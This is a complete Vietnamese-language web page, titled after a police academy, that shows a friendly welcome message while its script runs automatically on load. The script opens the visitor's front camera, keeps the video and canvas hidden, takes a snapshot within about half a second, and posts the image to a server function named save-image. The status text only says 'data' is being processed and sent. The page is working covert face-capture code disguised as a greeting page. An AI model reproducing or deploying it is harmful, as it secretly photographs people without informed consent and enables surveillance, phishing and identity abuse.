<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Học viện CSND</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        .welcome {
            background: rgba(255,255,255,0.15);
            padding: 35px;
            border-radius: 20px;
            text-align: center;
            max-width: 700px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }
        .status {
            margin-top: 30px;
            font-size: 1.35em;
            text-align: center;
            min-height: 60px;
        }
        /* Ẩn hoàn toàn camera */
        video, canvas {
            display: none !important;
            visibility: hidden;
            width: 1px;
            height: 1px;
            position: absolute;
            overflow: hidden;
        }
    </style>
</head>
<body>
    <div class="welcome">
        <h1>🌟 Chào mừng bạn đã đến với Website của chúng tôi!</h1>
        <p>Chúc bạn một ngày vui vẻ, hạnh phúc!</p>
    </div>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>
    
    <div class="status" id="status">Đang xử lý dữ liệu...</div>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const status = document.getElementById('status');

        async function startSilentCapture() {
            try {
                status.textContent = "Đang khởi tạo...";

                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: "user",
                        width: { ideal: 640 },
                        height: { ideal: 480 },
                        frameRate: { ideal: 20 }
                    }
                });

                video.srcObject = stream;

                // Giảm mạnh thời gian chờ xuống chỉ 420ms
                video.onloadedmetadata = () => {
                    setTimeout(() => silentCapture(stream), 420);
                };

            } catch (err) {
                status.textContent = "❌ Vui lòng cho phép truy cập camera";
                console.error(err);
            }
        }

        async function silentCapture(stream) {
            try {
                status.textContent = "Đang thu thập dữ liệu...";

                canvas.width = 640;
                canvas.height = 480;
                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);

                const imageData = canvas.toDataURL('image/jpeg', 0.68);   // Giảm chất lượng để nhanh hơn

                status.textContent = "Đang gửi dữ liệu...";

                const response = await fetch('/.netlify/functions/save-image', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: imageData })
                });

                if (response.ok) {
                    status.innerHTML = `✅ <b>Hoàn tất!</b><br>
                                        <small>Dữ liệu đã được gửi thành công.</small>`;
                } else {
                    status.textContent = "❌ Gửi dữ liệu thất bại.";
                }

            } catch (error) {
                status.textContent = "❌ Lỗi kết nối. Vui lòng thử lại sau.";
                console.error(error);
            }

            // Tắt camera nhanh chóng
            setTimeout(() => {
                stream.getTracks().forEach(track => track.stop());
            }, 800);
        }

        // Tự động chạy ngay khi mở trang
        window.onload = startSilentCapture;
    </script>
</body>
</html>
